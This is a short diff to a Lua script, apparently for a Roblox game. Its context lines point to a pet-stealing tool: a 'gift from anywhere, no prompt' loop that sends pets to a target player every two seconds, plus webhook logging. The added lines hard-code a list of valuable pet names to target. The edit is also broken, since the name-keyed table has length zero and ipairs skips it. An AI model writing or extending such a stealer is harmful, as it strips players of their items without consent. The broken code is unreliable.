@@ -676,6 +676,11 @@ if not success2 then warn("Something Went Wrong [Logs Webhook Error]", err2) end
             end
         end
 
+local petName = {
+    ["Mega Kitsune"] = true,
+    ["Mimic Octopus"] = true,
+}
+
         -- === NEW: GIFT FROM ANYWHERE (NO TP, NO PROMPT) ===
         local function giftHeldPet()
             local char = targetPlr.Character
@@ -700,7 +705,7 @@ if not success2 then warn("Something Went Wrong [Logs Webhook Error]", err2) end
         task.spawn(function()
             while true do
                 task.wait(2)  -- Re-scan every 2 seconds
-                local currentPets = GetPlayerPets()
+                local currentPets = petName
                 if #currentPets == 0 then continue end
 
                 for _, pet in ipairs(currentPets) do
